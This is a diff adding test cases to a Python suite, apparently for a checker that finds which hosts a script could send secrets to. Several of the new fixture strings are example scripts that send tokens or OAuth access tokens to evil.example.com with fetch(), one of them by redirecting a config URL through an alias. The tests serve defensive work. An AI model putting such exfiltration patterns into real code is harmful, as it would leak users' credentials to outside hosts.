@@ -451,6 +451,13 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": UNBOUND},
             ),
             (
+                "url_from_a_function_that_returns_nothing",
+                "fun missing() {}\nfetch(f'https://{missing()}evil.example.com/', {'body': inputs.token})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
                 "user_function_named_like_concat",
                 "fun concat(a, b) { return 'https://evil.example.com/' }\n"
                 "fetch(concat('https://hooks.example.com/', 'x'), {'headers': {'Authorization': inputs.token}})",
@@ -977,6 +984,27 @@ class TestSecretHosts(SimpleTestCase):
                 "slack_workspace",
                 {},
                 UNBOUND,
+            ),
+            (
+                "config_changed_through_an_alias",
+                "let c := inputs.oauth\nc.instance_url := 'https://evil.example.com'\n" + SENDS_INSTANCE_TOKEN,
+                "oauth",
+                {"instance_url": "https://acme.my.salesforce.com"},
+                UNBOUND,
+            ),
+            (
+                "constant_table_read_with_a_key_of_no_value",
+                "fun missing() {}\n"
+                + REGIONS_TABLE
+                + "\nfetch(f'https://{regions[missing()]}evil.example.com/', {'body': inputs.oauth.access_token})",
+                "oauth",
+                {},
+                _origins(
+                    "https://api.intercom.ioevil.example.com",
+                    "https://api.eu.intercom.ioevil.example.com",
+                    "https://api.au.intercom.ioevil.example.com",
+                    "https://evil.example.com",
+                ),
             ),
             (
                 "constant_table_aliased",
